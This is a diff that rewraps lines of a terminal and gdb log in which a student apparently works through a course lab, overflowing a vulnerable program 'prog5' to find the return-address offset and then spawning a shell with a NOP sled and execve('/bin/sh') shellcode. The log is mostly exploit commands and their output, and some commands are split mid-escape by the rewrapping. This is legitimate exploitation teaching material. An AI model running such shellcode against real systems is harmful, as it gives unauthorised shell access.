@@ -72,7 +72,8 @@ Breakpoint 2 at 0x5655581f
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 140 + 'B' * 4")
-Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 
 Breakpoint 2, 0x5655581f in main ()
@@ -81,7 +82,11 @@ Continuing.
 [Inferior 1 (process 29547) exited normally]
 (gdb) r $(python -c "print 'A' * 500 + 'B' * 4")
 Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 500 + 'B' * 4")
-Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 
 Breakpoint 2, 0x5655581f in main ()
@@ -90,7 +95,11 @@ Continuing.
 [Inferior 1 (process 29551) exited normally]
 (gdb) r $(python -c "print 'A' * 508 + 'B' * 4")
 Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 508 + 'B' * 4")
-Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -102,7 +111,12 @@ Program terminated with signal SIGSEGV, Segmentation fault.
 The program no longer exists.
 (gdb) r $(python -c "print 'A' * 580 + 'B' * 4")
 Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 580 + 'B' * 4")
-Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -111,7 +125,11 @@ Program received signal SIGSEGV, Segmentation fault.
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 516 + 'B' * 4")
-Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -120,16 +138,28 @@ Program received signal SIGSEGV, Segmentation fault.
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 Starting program: /usr/local/bin/prog5 $(python -c "print 'A' * 512 + 'B' * 4")
-Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Hello, what is the magic word?: You said AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 
 Program received signal SIGSEGV, Segmentation fault.
 0x42424242 in ?? ()
-(gdb) r $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')
+(gdb) r $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\x89\
+xc2\xb0\x0b\xcd\x80" + "B"*4')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')
-Hello, what is the magic word?: You said ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph/shh/bie��PS���°
+Starting program: /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\
+6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "B"*4')
+Hello, what is the magic word?: You said ������������������������������������������������
+��������������������������������������������������������������������������
+��������������������������������������������������������������������������
+��������������������������������������������������������������������������
+��������������������������������������������������������������������������
+��������������������������������������������������������������������������
+�����������������������������������������������������������1�Ph/shh/bie��PS���°
                            BBBB
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 
@@ -237,12 +267,21 @@ Breakpoint 2, 0x5655581f in main ()
 0xffffdfe0:     0x2f000000      0x2f727375      0x61636f6c      0x69622f6c
 0xffffdff0:     0x72702f6e      0x0035676f      0x00000000      0x00000000
 0xffffe000:     Cannot access memory at address 0xffffe000
-(gdb) r $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
+(gdb) r $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\
+x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 
-Starting program: /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
-Hello, what is the magic word?: You said ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph/shh/bie��PS���°
+Starting program: /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\
+x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
+Hello, what is the magic word?: You said ����������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+�����������������������������������������������������������������������1
+�Ph/shh/bie��PS���°
                            P���
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 
@@ -252,17 +291,41 @@ Continuing.
 [Inferior 1 (process 29583) exited normally]
 (gdb) quit
 husky026@bandit:~$ gdb prog5^C
-husky026@bandit:~$ /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
-Hello, what is the magic word?: You said ���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph/shh/bie��PS���°
+husky026@bandit:~$ /usr/local/bin/prog5 $(python -c 'print "\x90"*477 + "\x31\xc0\x50\x68\x2f\x73\x68\x68\x2f\x62\
+x69\6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xdd\xff\xff"')
+Hello, what is the magic word?: You said ����������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+�����������������������������������������������������������������������1
+�Ph/shh/bie��PS���°
                            P���
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
-husky026@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x50\xdd\xff\xff"')
-Hello, what is the magic word?: You said ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin���°
+husky026@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
+x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x50\xdd\xff\xff"')
+Hello, what is the magic word?: You said ����������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������1�Ph//shh/bin���°
                                1�@P���
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 Segmentation fault
-husky026@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x50\xdd\xff\xff"')
-Hello, what is the magic word?: You said ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin�����°
+husky026@bandit:~$ prog5 $(python2 -c 'print "\x90" * 484 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
+x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x50\xdd\xff\xff"')
+Hello, what is the magic word?: You said ����������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������������������������������������������������������������������������
+������1�Ph//shh/bin�����°
                                  1�@P���
 Epic Fail! Epic Fail! Epic Fail! Epic Fail!
 $ /bin/grade
